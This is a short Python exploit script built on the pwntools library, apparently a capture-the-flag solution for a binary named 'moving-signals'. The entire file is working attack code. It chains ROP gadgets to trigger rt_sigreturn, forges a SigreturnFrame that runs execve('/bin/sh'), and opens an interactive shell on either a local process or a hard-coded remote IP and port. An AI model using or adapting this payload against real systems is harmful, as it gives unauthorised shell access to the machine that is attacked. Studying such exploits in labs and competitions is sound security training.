#!/usr/bin/env python3
from pwn import process, log, ELF, SigreturnFrame, constants, p64, context, args, remote

context.arch = 'amd64'
FILE = './moving-signals'
BINARY = ELF(FILE)


def start():
    if not args.REMOTE:
        return process(FILE)
    else:
        return remote('161.97.176.150', 2525)

p = start()

pop_rax = 0x41018 # pop rax; ret
syscall = 0x41015 # syscall; ret
binsh = 0x41250 # /bin/sh\x00

payload = p64(binsh)
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdx = 0x0 # clear the value
frame.rsi = 0x0 # clear the value
frame.rdi = binsh
frame.rip = syscall

payload += bytes(frame)

p.sendline(payload)
p.interactive()
